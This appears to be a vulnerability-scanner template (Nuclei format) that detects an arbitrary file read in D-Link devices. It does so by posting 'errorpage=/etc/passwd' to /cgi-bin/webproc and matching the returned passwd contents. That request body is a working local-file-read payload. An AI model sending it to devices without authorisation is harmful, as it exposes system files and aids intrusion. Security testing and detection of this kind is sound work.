id: dlink-file-read
info:
  author: dhiyaneshDK
  name: D-Link - Arbitrary File Retrieval
  reference:
  - https://suid.ch/research/DAP-2020_Preauth_RCE_Chain.html
  severity: high
  tags: dlink,lfi
requests:
- body: errorpage=/etc/passwd&obj-action=auth&:action=login
  matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/cgi-bin/webproc'
